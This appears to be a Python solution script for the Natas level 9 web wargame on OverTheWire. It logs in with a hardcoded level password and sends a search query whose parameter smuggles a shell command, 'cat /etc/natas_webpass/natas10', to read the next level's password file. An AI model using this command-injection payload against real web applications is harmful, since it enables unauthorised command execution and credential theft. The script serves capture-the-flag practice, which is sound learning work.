# webscraper for natas9
import requests
from bs4 import BeautifulSoup
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
url = 'http://%s.natas.labs.overthewire.org/' % username
proxies = {
    'http': 'http://127.0.0.1:6996',
    'https': 'http://127.0.0.1:6996',
}

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password))
    content = resp.text
    #print(content)
    queryString = '/?needle=zzz%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search' #query string, with code injection.
    resp2 = session.get(url + queryString, auth=(username, password))
    passwordText = resp2.text
    soup = BeautifulSoup(passwordText, 'html.parser')
    passString = str(soup.body)
    regex = re.findall("\w{32}", passString)
    print(regex)



viewSource = initialRequest()

